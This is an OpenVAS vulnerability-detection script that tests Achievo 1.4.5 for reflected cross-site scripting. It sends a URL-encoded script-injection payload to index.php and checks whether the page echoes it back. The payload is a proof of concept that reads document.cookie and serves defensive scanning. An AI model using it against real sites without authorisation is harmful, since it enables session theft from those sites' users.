###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_achievo_xss_vuln.nasl 11523 2018-09-21 13:37:35Z asteins $
#
# Achievo Cross Site Scripting vulnerability-Mar16
#
# Authors:
# Kashinath T <tkashinath@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:achievo:achievo";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807623");
  script_version("$Revision: 11523 $");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-21 15:37:35 +0200 (Fri, 21 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-04-06 16:24:56 +0530 (Wed, 06 Apr 2016)");
  script_name("Achievo Cross Site Scripting vulnerability-Mar16");

  script_tag(name:"summary", value:"The host is installed with Achievo and is
  prone to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request and check
  whether it is possible to read a cookie or not.");

  script_tag(name:"insight", value:"The flaw exists due to an improper sanitization
  of input to 'index.php' page.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to obtain potentially sensitive information, which may lead to
  further attacks.");

  script_tag(name:"affected", value:"Achievo 1.4.5");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2016/Mar/74");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_achievo_detect.nasl");
  script_mandatory_keys("Achievo/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!achPort = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:achPort)){
  exit(0);
}

url = dir + '/index.php?%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E';

if(http_vuln_check(port:achPort, url:url, check_header:TRUE,
   pattern:"<script>alert\(document\_cookie\)</script>",
   extra_check:make_list("Achievo", ">Login", ">Username")))
{
  report = report_vuln_url( port:achPort, url:url );
  security_message(port:achPort, data:report);
  exit(0);
}
